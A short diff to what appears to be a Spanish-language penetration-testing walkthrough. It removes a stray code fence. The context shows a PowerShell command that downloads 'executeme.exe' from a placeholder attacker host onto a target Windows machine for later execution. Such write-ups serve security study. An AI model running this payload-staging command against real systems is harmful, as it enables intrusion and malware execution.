@@ -406,7 +406,7 @@ cd C:\Users\bitbucket\Appdata\Local\VirtualStore
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://[IPAtacante]:8080/executeme.exe', 'C:\Users\bitbucket\AppData\Local\VirtualStore\executeme.exe')"
 ```
 
-```
+
 También podemos utilizar el siguiente comando. Sea como sea que lo hagamos, tendremos el archivo executeme.exe en el equipo objetivo listo para ser ejecutado.
 
 ```
